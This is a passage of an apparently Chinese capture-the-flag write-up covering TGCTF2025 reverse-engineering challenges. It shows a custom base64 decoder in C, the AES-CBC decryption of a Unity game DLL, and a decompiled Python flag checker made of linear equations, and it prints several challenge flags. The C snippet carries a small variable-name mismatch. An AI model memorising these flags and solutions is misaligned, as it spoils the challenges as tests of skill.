class="line"></span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; input_len - padding)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b1, b2, b3, b4;</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v1 = reverse_table[_input_[i++]];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v2 = reverse_table[_input_[i++]];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v3 = (i &lt; input_len) ? reverse_table[_input_[i++]] : <span class="number">0</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v4 = (i &lt; input_len) ? reverse_table[_input_[i++]] : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        b1 = (v1 &gt; <span class="number">24</span>) ? (v1 - <span class="number">24</span>) : (v1 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line">        b2 = (v2 &gt; <span class="number">24</span>) ? (v2 - <span class="number">24</span>) : (v2 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line">        b3 = (v3 &gt; <span class="number">24</span>) ? (v3 - <span class="number">24</span>) : (v3 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line">        b4 = (v4 &gt; <span class="number">24</span>) ? (v4 - <span class="number">24</span>) : (v4 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (j &lt; output_len)</span><br><span class="line">            output[j++] = (b1 &lt;&lt; <span class="number">2</span>) | (b2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> (j &lt; output_len)</span><br><span class="line">            output[j++] = (b2 &lt;&lt; <span class="number">4</span>) | (b3 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (j &lt; output_len)</span><br><span class="line">            output[j++] = (b3 &lt;&lt; <span class="number">6</span>) | b4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span> *)output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *Enc= <span class="string">&quot;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *Decoded= <span class="built_in">base64_decode</span>(Enc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, Decoded);</span><br><span class="line">    <span class="built_in">free</span>(decoded);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}</p><h2 id="水果忍者"><a href="#水果忍者" class="headerlink" title="水果忍者"></a>水果忍者</h2><p>主要 dll 目录：\水果忍者\Fruit Ninja_Data\Managed\Assembly-CSharp.dll</p><p>拖入 dnSpy 分析，是 AES CBC 加密。</p><p><img src="/2025/04/13/TGCTF2025/SkHubyVDToXzQ5x3DFBcF7PQntf.png"></p><p>底下有密文、密钥、iv，直接解密即可。</p><p><img src="/2025/04/13/TGCTF2025/E150bPmfNoFuhzxZfGqcRtBunkd.png"></p><p><img src="/2025/04/13/TGCTF2025/IOlAbPLIwomQLFxru43cw9Ubn0e.png"></p><p>HZNUCTF{de20-70dd-4e62-b8d0-06e}</p><h2 id="蛇年的本命语言"><a href="#蛇年的本命语言" class="headerlink" title="蛇年的本命语言"></a>蛇年的本命语言</h2><p>python 程序解包得到 pyc（python 3.8），使用 uncompyle6 解密得到代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from collections <span class="keyword">import</span> Counter</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;Welcome to HZNUCTF!!!&quot;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;Plz input the flag:&quot;</span>)</span></span></span><br><span class="line"><span class="function">ooo0oOoooOOO0 </span>= <span class="built_in">input</span>()</span><br><span class="line">oOO0OoOoo000 = <span class="built_in">Counter</span>(ooo0oOoooOOO0)</span><br><span class="line">O0o00 = <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>((<span class="built_in">str</span>(oOO0OoOoo000[oOooo0OOO]) <span class="keyword">for</span> oOooo0OOO in ooo0oOoooOOO0))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ans1: &quot;</span>, _end_=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(O0o00)</span><br><span class="line"><span class="keyword">if</span> O0o00 != <span class="string">&quot;111111116257645365477364777645752361&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong_wrong!!!&quot;</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>)</span><br><span class="line">iiIII = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> oOooo0OOO in ooo0oOoooOOO0:</span><br><span class="line">    <span class="keyword">if</span> oOO0OoOoo000[oOooo0OOO] &gt; <span class="number">0</span>:</span><br><span class="line">        iiIII += oOooo0OOO + <span class="built_in">str</span>(oOO0OoOoo000[oOooo0OOO])</span><br><span class="line">        oOO0OoOoo000[oOooo0OOO] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i11i1Iii1I1 = [<span class="built_in">ord</span>(oOooo0OOO) <span class="keyword">for</span> oOooo0OOO in iiIII]</span><br><span class="line">        ii1iIi1i11i = [</span><br><span class="line">         <span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] == <span class="number">504</span>,</span><br><span class="line">         <span class="number">9</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>] == <span class="number">403</span>,</span><br><span class="line">         <span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] == <span class="number">799</span>,</span><br><span class="line">         <span class="number">3</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">3</span>] == <span class="number">2938</span>,</span><br><span class="line">         <span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">19</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">4</span>] == <span class="number">2042</span>,</span><br><span class="line">         <span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">5</span> * i11i1Iii1I1[<span class="number">5</span>] == <span class="number">1225</span>,</span><br><span class="line">         <span class="number">11</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">77</span> * i11i1Iii1I1[<span class="number">6</span>] == <span class="number">7975</span>,</span><br><span class="line">         <span class="number">21</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">7</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">7</span>] == <span class="number">229</span>,</span><br><span class="line">         <span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">8</span>] == <span class="number">2107</span>,</span><br><span class="line">         <span class="number">10</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">30</span> * i11i1Iii1I1[<span class="number">9</span>] == <span class="number">4037</span>,</span><br><span class="line">         <span class="number">15</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">59</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">56</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">122</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] == <span class="number">4950</span>,</span><br><span class="line">         <span class="number">13</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">42</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">62</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] == <span class="number">12544</span>,</span><br><span class="line">         <span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">63</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">25</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] == <span class="number">6585</span>,</span><br><span class="line">         <span class="number">223</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">53</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">13</span>] == <span class="number">6893</span>,</span><br><span class="line">         <span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">68</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">14</span> * i11i1Iii1I1[<span class="number">14</span>] == <span class="number">1883</span>,</span><br><span class="line">         <span class="number">69</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">77</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">8</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">38</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] == <span class="number">8257</span>,</span><br><span class="line">         <span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">12</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">14</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">68</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">68</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">16</span>] == <span class="number">5847</span>,</span><br><span class="line">         <span class="number">24</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">67</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">146</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">50</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">27</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">45</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">17</span> * i11i1Iii1I1[<span class="number">17</span>] == <span class="number">18257</span>,</span><br><span class="line">         <span class="number">25</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">89</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">150</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">250</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">166</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">126</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">207</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>] == <span class="number">12591</span>,</span><br><span class="line">         <span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">160</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">19</span>] == <span class="number">52041</span>,</span><br><span class="line">         <span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">60</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">20</span>] == <span class="number">20253</span>,</span><br><span class="line">         <span class="number">45</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">650</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">900</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">651</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] == <span class="number">18768</span>,</span><br><span class="line">         <span class="number">555</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">6666</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">70</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">510</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">499</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">610</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">221</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">23</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">102</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2050</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">665</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">22</span>] == <span class="number">111844</span>,</span><br><span class="line">         <span class="number">1</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4444</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">5555</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">676</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">107</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] == <span class="number">159029</span>,</span><br><span class="line">         <span class="number">520</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">222</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56655</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">1007</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">7777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span 